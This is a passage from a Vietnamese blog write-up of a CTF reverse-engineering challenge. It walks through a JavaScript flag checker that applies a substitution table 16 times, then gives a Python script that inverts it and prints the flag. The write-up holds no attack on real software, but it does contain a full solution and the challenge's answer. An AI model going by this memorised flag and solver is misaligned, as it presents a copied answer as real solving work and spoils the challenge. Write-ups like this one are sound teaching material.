</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">236</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">34</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">213</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">166</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">217</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">230</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>  ]
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">44</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Incorrect length!&#39;</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">key</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">key</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">key</span>))
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0xfc20f8</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">_0xfc20f8</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; <span style="color:#a6e22e">_0xfc20f8</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">options</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> window[<span style="color:#a6e22e">options</span>[<span style="color:#a6e22e">i</span>]]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">byteArrayToBase64</span>(<span style="color:#a6e22e">options</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">value</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Incorrect flag!&#39;</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Good job, you&#39;re welcome!!&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mọi thứ có vẻ đã rõ ràng hơn !
Tới đây, mảng chúng ta phải nhập vào phải có đúng 44 kí tự và sau đó được chuyển vào hàm <code>check()</code>.</p>
<p>Chương trình thực hiện 1 vòng lặp 16 lần, qua mỗi lần cập nhật <code> inputString[j] = xorValues[inputString[j]</code>, mỗi vòng như vậy thay đổi 44 kí tự của <code>inputString</code></p>
<p>Sau khi kết thúc, chuyển string này về base64 và so sánh với chuỗi đã cho <code>/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=</code></p>
<p>-&gt; Sau đây là script mình giải bài này:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.py">pupu.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">118</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">114</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">49</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">209</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">170</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">143</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">236</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">34</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">213</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">166</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">217</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">230</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dec_flag <span style="color:#f92672">=</span> bytearray(base64<span style="color:#f92672">.</span>b64decode(enc_flag))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>map<span style="color:#f92672">=</span>{val: idx <span style="color:#66d9ef">for</span> idx, val <span style="color:#f92672">in</span> enumerate(key)}
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        dec_flag <span style="color:#f92672">=</span> bytearray(map[byte] <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> dec_flag)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">=</span>bytes(dec_flag)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(flag<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{Nice_but_your_nightmare_has_just_started}</code></p>
</div>
</article>

    <hr />
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                href="/tags/ctf/">#ctf</a>
        
            <a
                
                href="/tags/pwn/">#pwn</a>
        
            <a
                
                href="/tags/test/">#test</a>
        
    </p>






                    </main><footer>
    <hr />

<p><small>
        2024 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
